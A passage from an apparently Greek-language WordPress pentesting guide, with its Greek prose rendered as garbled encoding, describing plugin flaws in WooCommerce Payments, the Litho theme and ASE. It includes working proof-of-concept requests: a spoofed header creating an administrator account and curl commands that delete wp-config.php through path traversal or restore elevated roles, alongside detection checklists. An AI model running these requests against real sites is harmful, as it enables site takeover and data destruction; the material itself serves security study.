> Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î±Î½ Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Î±Ï€Î»ÏÏ‚ ÎµÎ»Î­Î³Ï‡ÎµÎ¹ Ï„Î·Î½ ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ· Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· Î¼Îµ Ï„Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· `wp_verify_nonce`, Î±Ï…Ï„Î® Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Î±Ï€Î»ÏÏ‚ ÎµÏ€Î±Î»Î·Î¸ÎµÏÎµÎ¹ ÏŒÏ„Î¹ Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ ÎµÎ¯Î½Î±Î¹ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î¿Ï‚ â€” ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î´ÎµÎ½ ÎµÎ»Î­Î³Ï‡ÎµÎ¹ Ï„Î¿ ÏÏŒÎ»Î¿ Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î·. ÎˆÏ„ÏƒÎ¹ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î¼Îµ Ï‡Î±Î¼Î·Î»Î¬ Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î­Ï‡Î¿Ï…Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ Î¼Îµ Ï…ÏˆÎ·Î»Î¬ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±.

- **REST API**

Î•Ï€Î¯ÏƒÎ·Ï‚ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± ÎµÎºÏ„ÎµÎ¸Î¿ÏÎ½ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ Î±Ï€ÏŒ Ï„Î¿ wordpress ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ¯Î¶Î¿Î½Ï„Î±Ï‚ Î­Î½Î± REST API Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
Î— `permission_callback` ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± callback ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Ï€Î¿Ï… ÎµÎ»Î­Î³Ï‡ÎµÎ¹ Î±Î½ Î­Î½Î±Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Î¿Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ ÎµÎ¯Î½Î±Î¹ ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î¿Ï‚ Î½Î± ÎºÎ±Î»Î­ÏƒÎµÎ¹ Ï„Î·Î½ API Î¼Î­Î¸Î¿Î´Î¿.

**If the built-in `__return_true` function is used, it'll simply skip user permissions check.**

- **Î†Î¼ÎµÏƒÎ· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ php Î±ÏÏ‡ÎµÎ¯Î¿**

Î¦Ï…ÏƒÎ¹ÎºÎ¬, Wordpress Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ PHP ÎºÎ±Î¹ Î±ÏÏ‡ÎµÎ¯Î± Î¼Î­ÏƒÎ± ÏƒÎµ plugins ÎµÎ¯Î½Î±Î¹ Î¬Î¼ÎµÏƒÎ± Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎ¹Î¼Î± Î±Ï€ÏŒ Ï„Î¿ web. ÎŸÏ€ÏŒÏ„Îµ, ÏƒÏ„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Ï€Î¿Ï… Î­Î½Î± plugin ÎµÎºÎ¸Î­Ï„ÎµÎ¹ ÎºÎ¬Ï€Î¿Î¹Î± ÎµÏ…Ï€Î±Î¸Î® Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÏŒÏ„Î·Ï„Î± Ï€Î¿Ï… ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î±Ï€Î»ÏÏ‚ Î¼Îµ Ï„Î·Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿, Î¸Î± ÎµÎ¯Î½Î±Î¹ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏƒÎ¹Î¼Î· Î±Ï€ÏŒ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ Ï‡ÏÎ®ÏƒÏ„Î·.

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

Some plugins implement â€œtrusted headerâ€ shortcuts for internal integrations or reverse proxies and then use that header to set the current user context for REST requests. If the header is not cryptographically bound to the request by an upstream component, an attacker can spoof it and hit privileged REST routes as an administrator.

- Î•Ï€Î¯Ï€Ï„Ï‰ÏƒÎ·: unauthenticated privilege escalation ÏƒÎµ admin Î¼Î­ÏƒÏ‰ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î±Ï‚ Î½Î­Î¿Ï… administrator Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… core users REST route.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (Î±Î½Î±Î³ÎºÎ¬Î¶ÎµÎ¹ user ID 1, ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Ï„Î¿Î½ Ï€ÏÏÏ„Î¿ administrator account).
- Exploited route: `POST /wp-json/wp/v2/users` Î¼Îµ Î­Î½Î± elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Î“Î¹Î±Ï„Î¯ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯

- Î¤Î¿ plugin Î±Î½Ï„Î¹ÏƒÏ„Î¿Î¹Ï‡Î¯Î¶ÎµÎ¹ Î­Î½Î± header Ï€Î¿Ï… ÎµÎ»Î­Î³Ï‡ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ client ÏƒÏ„Î·Î½ ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· authentication ÎºÎ±Î¹ Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„ÎµÎ¹ Ï„Î¿Ï…Ï‚ ÎµÎ»Î­Î³Ï‡Î¿Ï…Ï‚ capability.
- Î¤Î¿ WordPress core Î±Î½Î±Î¼Î­Î½ÎµÎ¹ Ï„Î·Î½ capability `create_users` Î³Î¹Î± Î±Ï…Ï„ÏŒ Ï„Î¿ routeÂ· Ï„Î¿ hack Ï„Î¿Ï… plugin Ï„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„ÎµÎ¹ ÏÏ…Î¸Î¼Î¯Î¶Î¿Î½Ï„Î±Ï‚ Î¬Î¼ÎµÏƒÎ± Ï„Î¿ current user context Î±Ï€ÏŒ Ï„Î¿ header.

Î”ÎµÎ¯ÎºÏ„ÎµÏ‚ ÎµÏ€Î¹Ï„Ï…Ï‡Î¯Î±Ï‚

- HTTP 201 Î¼Îµ JSON ÏƒÏÎ¼Î± Ï€Î¿Ï… Ï€ÎµÏÎ¹Î³ÏÎ¬Ï†ÎµÎ¹ Ï„Î¿Î½ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¼Î­Î½Î¿ Ï‡ÏÎ®ÏƒÏ„Î·.
- ÎÎ­Î¿Ï‚ admin Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¿ÏÎ±Ï„ÏŒÏ‚ ÏƒÏ„Î¿ `wp-admin/users.php`.

Î›Î¯ÏƒÏ„Î± ÎµÎ»Î­Î³Ï‡Î¿Ï… ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÎ¼Î¿Ï

- Î¨Î¬Î¾Ï„Îµ Î¼Îµ grep Î³Î¹Î± `getallheaders()`, `$_SERVER['HTTP_...']` Î® vendor SDKs Ï€Î¿Ï… Î´Î¹Î±Î²Î¬Î¶Î¿Ï…Î½ custom headers Î³Î¹Î± Î½Î± Î¿ÏÎ¯ÏƒÎ¿Ï…Î½ Ï„Î¿ user context (Ï€.Ï‡. `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Î•Î¾ÎµÏ„Î¬ÏƒÏ„Îµ Ï„Î¹Ï‚ REST registrations Î³Î¹Î± privileged callbacks Ï€Î¿Ï… ÏƒÏ„ÎµÏÎ¿ÏÎ½Ï„Î±Î¹ Î¹ÏƒÏ‡Ï…ÏÏÎ½ ÎµÎ»Î­Î³Ï‡Ï‰Î½ `permission_callback` ÎºÎ±Î¹ ÏƒÏ„Î·ÏÎ¯Î¶Î¿Î½Ï„Î±Î¹ Î±Î½Ï„Î¯Î¸ÎµÏ„Î± ÏƒÎµ request headers.
- Î¨Î¬Î¾Ï„Îµ Î³Î¹Î± usages Ï„Ï‰Î½ core user-management functions (`wp_insert_user`, `wp_create_user`) Î¼Î­ÏƒÎ± ÏƒÎµ REST handlers Ï€Î¿Ï… Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏÎ¿Î½Ï„Î±Î¹ Î¼ÏŒÎ½Î¿ Î±Ï€ÏŒ Ï„Î¹Î¼Î­Ï‚ header.

### ÎœÎ·-ÎµÏ€Î±Î»Î·Î¸ÎµÏ…Î¼Î­Î½Î· Î‘Ï…Î¸Î±Î¯ÏÎµÏ„Î· Î”Î¹Î±Î³ÏÎ±Ï†Î® Î‘ÏÏ‡ÎµÎ¯Ï‰Î½ Î¼Î­ÏƒÏ‰ wp_ajax_nopriv (Litho Theme <= 3.0)

Î¤Î± WordPress Î¸Î­Î¼Î±Ï„Î± ÎºÎ±Î¹ plugins ÏƒÏ…Ï‡Î½Î¬ ÎµÎºÎ¸Î­Ï„Î¿Ï…Î½ AJAX handlers Î¼Î­ÏƒÏ‰ Ï„Ï‰Î½ hooks `wp_ajax_` ÎºÎ±Î¹ `wp_ajax_nopriv_`. ÎŒÏ„Î±Î½ Î· Ï€Î±ÏÎ±Î»Î»Î±Î³Î® **_nopriv_** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ **Ï„Î¿ callback Î³Î¯Î½ÎµÏ„Î±Î¹ Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎ¹Î¼Î¿ Î±Ï€ÏŒ Î¼Î·-ÎµÏ€Î±Î»Î·Î¸ÎµÏ…Î¼Î­Î½Î¿Ï…Ï‚ ÎµÏ€Î¹ÏƒÎºÎ­Ï€Ï„ÎµÏ‚**, Î¿Ï€ÏŒÏ„Îµ ÎºÎ¬Î¸Îµ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„Î· ÎµÎ½Î­ÏÎ³ÎµÎ¹Î± Ï€ÏÎ­Ï€ÎµÎ¹ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ Î½Î± Ï…Î»Î¿Ï€Î¿Î¹ÎµÎ¯:

1. ÎˆÎ½Î±Î½ **Î­Î»ÎµÎ³Ï‡Î¿ capability** (Ï€.Ï‡. `current_user_can()` Î® Ï„Î¿Ï…Î»Î¬Ï‡Î¹ÏƒÏ„Î¿Î½ `is_user_logged_in()`), ÎºÎ±Î¹
2. ÎˆÎ½Î± **CSRF nonce** ÎµÏ€Î¹ÎºÏ…ÏÏ‰Î¼Î­Î½Î¿ Î¼Îµ `check_ajax_referer()` / `wp_verify_nonce()`, ÎºÎ±Î¹
3. **Î‘Ï…ÏƒÏ„Î·ÏÎ® ÎµÎ¾Ï…Î³Î¯Î±Î½ÏƒÎ· / ÎµÏ€Î¹ÎºÏÏÏ‰ÏƒÎ· ÎµÎ¹ÏƒÏŒÎ´Ï‰Î½**.

Î¤Î¿ Litho multipurpose theme (< 3.1) Î¾Î­Ï‡Î±ÏƒÎµ Î±Ï…Ï„Î¿ÏÏ‚ Ï„Î¿Ï…Ï‚ 3 ÎµÎ»Î­Î³Ï‡Î¿Ï…Ï‚ ÏƒÏ„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± *Remove Font Family* ÎºÎ±Î¹ Ï„ÎµÎ»Î¹ÎºÎ¬ Ï€Î±ÏÎµÎ¯Ï‡Îµ Ï„Î¿Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎºÏÎ´Î¹ÎºÎ± (Î±Ï€Î»Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿Ï‚):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Î ÏÎ¿Î²Î»Î®Î¼Î±Ï„Î± Ï€Î¿Ï… ÎµÎ¹ÏƒÎ¬Î³ÎµÎ¹ Î±Ï…Ï„ÏŒ Ï„Î¿ Î±Ï€ÏŒÏƒÏ€Î±ÏƒÎ¼Î±:

* **ÎœÎ· Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·** â€“ Ï„Î¿ hook `wp_ajax_nopriv_` ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎµÎ¯Ï„Î±Î¹.
* **ÎšÎ±Î¼Î¯Î± ÎµÏ€Î±Î»Î®Î¸ÎµÏ…ÏƒÎ· nonce / capability** â€“ Î¿Ï€Î¿Î¹Î¿ÏƒÎ´Î®Ï€Î¿Ï„Îµ ÎµÏ€Î¹ÏƒÎºÎ­Ï€Ï„Î·Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÏÎ¿ÏƒÏ€ÎµÎ»Î¬ÏƒÎµÎ¹ Ï„Î¿ endpoint.
* **ÎšÎ±Î¼Î¯Î± Î±Ï€Î¿Î»ÏÎ¼Î±Î½ÏƒÎ· Î´Î¹Î±Î´ÏÎ¿Î¼Î®Ï‚** â€“ Î· ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÎ¬ `fontfamily` Ï€Î¿Ï… ÎµÎ»Î­Î³Ï‡ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· ÏƒÏ…Î½ÎµÎ½ÏÎ½ÎµÏ„Î±Î¹ ÏƒÎµ Î¼Î¹Î± Î´Î¹Î±Î´ÏÎ¿Î¼Î® ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚ Î±ÏÏ‡ÎµÎ¯Ï‰Î½ Ï‡Ï‰ÏÎ¯Ï‚ Ï†Î¹Î»Ï„ÏÎ¬ÏÎ¹ÏƒÎ¼Î±, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ ÎºÎ»Î±ÏƒÎ¹ÎºÎ® `../../` traversal.

#### Exploitation

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î¹Î±Î³ÏÎ¬ÏˆÎµÎ¹ Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ Î±ÏÏ‡ÎµÎ¯Î¿ Î® ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿ **ÎºÎ¬Ï„Ï‰ Î±Ï€ÏŒ Ï„Î¿Î½ Î²Î±ÏƒÎ¹ÎºÏŒ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿ uploads** (ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ `<wp-root>/wp-content/uploads/`) ÏƒÏ„Î­Î»Î½Î¿Î½Ï„Î±Ï‚ Î­Î½Î± Î¼ÏŒÎ½Î¿ HTTP POST request:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Î•Ï€ÎµÎ¹Î´Î® Ï„Î¿ `wp-config.php` Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ Î­Î¾Ï‰ Î±Ï€ÏŒ Ï„Î¿ *uploads*, Ï„Î­ÏƒÏƒÎµÏÎ¹Ï‚ Î±ÎºÎ¿Î»Î¿Ï…Î¸Î¯ÎµÏ‚ `../` Î±ÏÎºÎ¿ÏÎ½ ÏƒÎµ Î¼Î¹Î± Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î· ÎµÎ³ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·. Î— Î´Î¹Î±Î³ÏÎ±Ï†Î® Ï„Î¿Ï… `wp-config.php` Î±Î½Î±Î³ÎºÎ¬Î¶ÎµÎ¹ Ï„Î¿ WordPress Î½Î± Î¼Ï€ÎµÎ¹ ÏƒÏ„Î¿ *installation wizard* ÏƒÏ„Î·Î½ ÎµÏ€ÏŒÎ¼ÎµÎ½Î· ÎµÏ€Î¯ÏƒÎºÎµÏˆÎ·, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Ï€Î»Î®ÏÎµÏ‚ site take-over (Î¿ attacker Î±Ï€Î»ÏÏ‚ Ï€Î±ÏÎ­Ï‡ÎµÎ¹ Î½Î­Î± DB configuration ÎºÎ±Î¹ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯ Î­Î½Î±Î½ admin Ï‡ÏÎ®ÏƒÏ„Î·).

Î†Î»Î»Î¿Î¹ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÎ¿Î¯ ÏƒÏ„ÏŒÏ‡Î¿Î¹ Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½ Î±ÏÏ‡ÎµÎ¯Î± plugin/theme `.php` (Î³Î¹Î± Î½Î± ÏƒÏ€Î¬ÏƒÎ¿Ï…Î½ security plugins) Î® ÎºÎ±Î½ÏŒÎ½ÎµÏ‚ `.htaccess`.

#### Î›Î¯ÏƒÏ„Î± ÎµÎ»Î­Î³Ï‡Î¿Ï… Î±Î½Î¯Ï‡Î½ÎµÏ…ÏƒÎ·Ï‚

* ÎŸÏ€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ callback `add_action( 'wp_ajax_nopriv_...')` Ï€Î¿Ï… ÎºÎ±Î»ÎµÎ¯ filesystem helpers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, Îº.Î»Ï€.).
* Î£Ï…Î½Î­Î½Ï‰ÏƒÎ· Î¼Î·-ÎµÎ»ÎµÎ³Ï‡ÏŒÎ¼ÎµÎ½Î·Ï‚ ÎµÎ¹ÏƒÏŒÎ´Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· ÏƒÎµ paths (Î±Î½Î±Î¶Î·Ï„Î®ÏƒÏ„Îµ `$_POST`, `$_GET`, `$_REQUEST`).
* Î‘Ï€Î¿Ï…ÏƒÎ¯Î± Ï„Ï‰Î½ `check_ajax_referer()` ÎºÎ±Î¹ `current_user_can()`/`is_user_logged_in()`.

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

Many plugins implement a "view as role" or temporary role-switching feature by saving the original role(s) in user meta so they can be restored later. If the restoration path relies only on request parameters (e.g., `$_REQUEST['reset-for']`) and a plugin-maintained list without checking capabilities and a valid nonce, this becomes a vertical privilege escalation.

ÎˆÎ½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÏŒ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î²ÏÎ­Î¸Î·ÎºÎµ ÏƒÏ„Î¿ Admin and Site Enhancements (ASE) plugin (â‰¤ 7.6.2.1). Î¤Î¿ reset branch ÎµÏ€Î±Î½Î­Ï†ÎµÏÎµ ÏÏŒÎ»Î¿Ï…Ï‚ Î²Î¬ÏƒÎµÎ¹ Ï„Î¿Ï… `reset-for=<username>` Î±Î½ Ï„Î¿ username ÎµÎ¼Ï†Î±Î½Î¹Î¶ÏŒÏ„Î±Î½ ÏƒÎµ Î­Î½Î±Î½ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÏŒ Ï€Î¯Î½Î±ÎºÎ± `$options['viewing_admin_as_role_are']`, Î±Î»Î»Î¬ Î´ÎµÎ½ ÎµÎºÏ„Î­Î»ÎµÏƒÎµ Î¿ÏÏ„Îµ Î­Î»ÎµÎ³Ï‡Î¿ `current_user_can()` Î¿ÏÏ„Îµ ÎµÏ€Î±Î»Î®Î¸ÎµÏ…ÏƒÎ· nonce Ï€ÏÎ¹Î½ Î±Ï†Î±Î¹ÏÎ­ÏƒÎµÎ¹ Ï„Î¿Ï…Ï‚ Ï„ÏÎ­Ï‡Î¿Î½Ï„ÎµÏ‚ ÏÏŒÎ»Î¿Ï…Ï‚ ÎºÎ±Î¹ ÎµÏ€Î±Î½Î±Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÎ¹ Ï„Î¿Ï…Ï‚ Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Î¼Î­Î½Î¿Ï…Ï‚ ÏÏŒÎ»Î¿Ï…Ï‚ Î±Ï€ÏŒ Ï„Î¿ user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Why itâ€™s exploitable

- Î•Î¼Ï€Î¹ÏƒÏ„ÎµÏÎµÏ„Î±Î¹ `$_REQUEST['reset-for']` ÎºÎ±Î¹ Î¼Î¹Î± ÎµÏ€Î¹Î»Î¿Î³Î® plugin Ï‡Ï‰ÏÎ¯Ï‚ ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ· Î±Ï€ÏŒ Ï„Î·Î½ Ï€Î»ÎµÏ…ÏÎ¬ Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®.
- Î•Î¬Î½ Î­Î½Î±Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Ï€ÏÎ¿Î·Î³Î¿Ï…Î¼Î­Î½Ï‰Ï‚ ÎµÎ¯Ï‡Îµ Ï…ÏˆÎ·Î»ÏŒÏ„ÎµÏÎ± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Î¼Î­Î½Î± ÏƒÏ„Î¿ `_asenha_view_admin_as_original_roles` ÎºÎ±Î¹ Ï…Ï€Î¿Î²Î±Î¸Î¼Î¯ÏƒÏ„Î·ÎºÎµ, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï„Î± ÎµÏ€Î±Î½Î±Ï†Î­ÏÎµÎ¹ Ï€ÏÎ¿ÏƒÏ€ÎµÎ»Î¬Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î¿ reset path.
- Î£Îµ ÎºÎ¬Ï€Î¿Î¹ÎµÏ‚ Î±Î½Î±Ï€Ï„ÏÎ¾ÎµÎ¹Ï‚, Î¿Ï€Î¿Î¹Î¿ÏƒÎ´Î®Ï€Î¿Ï„Îµ authenticated user Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Ï€ÏÎ¿ÎºÎ±Î»Î­ÏƒÎµÎ¹ reset Î³Î¹Î± Î¬Î»Î»Î¿ username Ï€Î¿Ï… ÎµÎ¾Î±ÎºÎ¿Î»Î¿Ï…Î¸ÎµÎ¯ Î½Î± Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ ÏƒÏ„Î¿ `viewing_admin_as_role_are` (broken authorization).

Exploitation (example)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Î£Îµ ÎµÏ…Î¬Î»Ï‰Ï„ÎµÏ‚ ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚ Î±Ï…Ï„ÏŒ Î±Ï†Î±Î¹ÏÎµÎ¯ Ï„Î¿Ï…Ï‚ Ï„ÏÎ­Ï‡Î¿Î½Ï„ÎµÏ‚ ÏÏŒÎ»Î¿Ï…Ï‚ ÎºÎ±Î¹ ÎµÏ€Î±Î½Î±Ï€ÏÎ¿ÏƒÎ¸Î­Ï„ÎµÎ¹ Ï„Î¿Ï…Ï‚ Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Î¼Î­Î½Î¿Ï…Ï‚ Î±ÏÏ‡Î¹ÎºÎ¿ÏÏ‚ ÏÏŒÎ»Î¿Ï…Ï‚ (Ï€.Ï‡. `administrator`), Î±Ï…Î¾Î¬Î½Î¿Î½Ï„Î±Ï‚ Î¿Ï…ÏƒÎ¹Î±ÏƒÏ„Î¹ÎºÎ¬ Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±.

Detection checklist

- Î‘Î½Î±Î¶Î·Ï„Î®ÏƒÏ„Îµ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚ role-switching Ï€Î¿Ï… Î´Î¹Î±Ï„Î·ÏÎ¿ÏÎ½ â€œoriginal rolesâ€ ÏƒÏ„Î¿ user meta (Ï€.Ï‡. `_asenha_view_admin_as_original_roles`).
- Î•Î½Ï„Î¿Ï€Î¯ÏƒÏ„Îµ Î´Î¹Î±Î´ÏÎ¿Î¼Î­Ï‚ ÎµÏ€Î±Î½Î±Ï†Î¿ÏÎ¬Ï‚ Ï€Î¿Ï…:
- Î”Î¹Î±Î²Î¬Î¶Î¿Ï…Î½ Î¿Î½ÏŒÎ¼Î±Ï„Î± Ï‡ÏÎ·ÏƒÏ„ÏÎ½ Î±Ï€ÏŒ `$_REQUEST` / `$_GET` / `$_POST`.
- Î¤ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î¿ÏÎ½ ÏÏŒÎ»Î¿Ï…Ï‚ Î¼Î­ÏƒÏ‰ `add_role()` / `remove_role()` Ï‡Ï‰ÏÎ¯Ï‚ `current_user_can()` ÎºÎ±Î¹ `wp_verify_nonce()` / `check_admin_referer()`.
- Î•Î¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î¿ÏÎ½ Î²Î¬ÏƒÎµÎ¹ Ï€Î¯Î½Î±ÎºÎ± ÎµÏ€Î¹Î»Î¿Î³ÏÎ½ plugin (Ï€.Ï‡. `viewing_admin_as_role_are`) Î±Î½Ï„Î¯ Î³Î¹Î± Ï„Î¹Ï‚ Î¹ÎºÎ±Î½ÏŒÏ„Î·Ï„ÎµÏ‚ Ï„Î¿Ï… ÎµÎ½ÎµÏÎ³Î¿ÏÎ½Ï„Î¿Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·.

---

### Unauthenticated privilege escalation via cookieâ€‘trusted user switching on public init (Service Finder â€œsf-bookingâ€)

